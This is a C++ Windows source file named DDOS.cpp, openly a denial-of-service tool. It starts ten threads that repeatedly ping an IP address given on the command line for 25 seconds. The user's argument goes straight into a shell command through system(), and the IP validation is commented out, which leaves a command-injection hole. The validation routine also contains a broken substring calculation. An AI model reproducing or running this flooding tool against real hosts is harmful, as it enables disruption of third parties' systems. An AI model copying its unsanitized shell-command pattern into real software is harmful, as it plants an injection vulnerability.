// DDOS.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include<stdlib.h>//DOS命令
#include<string>//字符串
#include <thread>//Multi-Thread
#include<time.h>//Time
#include<windows.h>
using namespace std;
# define THREAD 10
#define TIME 25000

bool IPcheck(string str);
DWORD WINAPI sys(LPVOID lpParameter);

string command = "ping ";
int main(int argc,char* argv[])

{
	int i, j;

    /*Command Line: DDOS.exe Target(ip) */
	if (argc != 2)
	{
		cout<<"Usage:Cmd.exe DDOS.exe Target(ip)"<<argc<<endl;
		system("pause");
		return 0;
	}
	/*Checking IP Address*/
	/*if (!IPcheck(argv[1]))
	{
		cout<<"[ERROR]\tIlligal IP Address String"<<argv[1]<<endl;
		system("pause");
		return 0;
	}*/
	
	/*Building Command*/
	
	command = command + argv[1];
	cout << "[COMFIRM]\tCommand Line" << command << endl;
	/*Multi-Thread*/
	HANDLE thr[THREAD];
	for (i = 0; i < THREAD; i++)
	{
		thr[i] = CreateThread(NULL, 0, sys,NULL, 0, NULL);
		cout << "Thread Created" << i << endl;
	}
	Sleep(TIME);
	for (i = 0; i < THREAD; i++)
	{
		CloseHandle(thr[i]);
		cout << "Thread Closed" << i << endl;
	}
	
		
	

}
DWORD WINAPI sys(LPVOID lpParameter)
{
	system((char*)command.c_str());
	return 0;
}


bool IPcheck(string str)
{
	int i, j;
	if (str.size()== 0)
	{
		return false;
	}//If Empty,Return False
	if (str.length() < 7 || str.length() > 15)
		return false;//Check Length
	if (count(str.begin(), str.end(), '.') != 3)
		return false;//Check Segment
	unsigned int locations[4];
	string seg[4];

	string strs = str;//Backup
	str = str + ".";//Add tail symbol to abstract
	for (i = 0; i < 4; i++)
	{
		if (i == 0)
		{
			locations[0]= str.find_first_of(".", 0);
		}
		else
		{
			locations[i] = str.find_first_of(".", locations[i - 1]+1);
		}
	}//To Locate Each .'s No.
	for (i = 0; i < 4; i++)
	{
		if (i == 0)
		{
			seg[0] = str.substr(0, locations[0]);
		}
		else
		{
			seg[i] = str.substr(locations[i - 1], locations[i]);
		}

	}//To Abstract SubString

	for (int i = 0; i < 4; i++)
	{
		if (seg[i].empty ())
			return false;
		//对分割得到的每个字符串的每个字符进行逐一判断，如果不是数字0-9，则判定为非法IP
		for (int j = 0; j <(int) seg[i].length(); j++) {
			if (seg[i][j] < '0' || seg[i][j] > '9') {
				return false;
			}
		}
	}
	for (int i = 0; i < 4; i++) {
		int temp = atoi(const_cast<char*>(seg[i].c_str()));
		if (i == 0) {
			if (temp < 1 || temp > 255) {
				return false;
			}
		}
		else {
			if (temp < 0 || temp > 255) {
				return false;
			}
		}//Check number's range
	}
	return true;//Check Pass	
}


// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
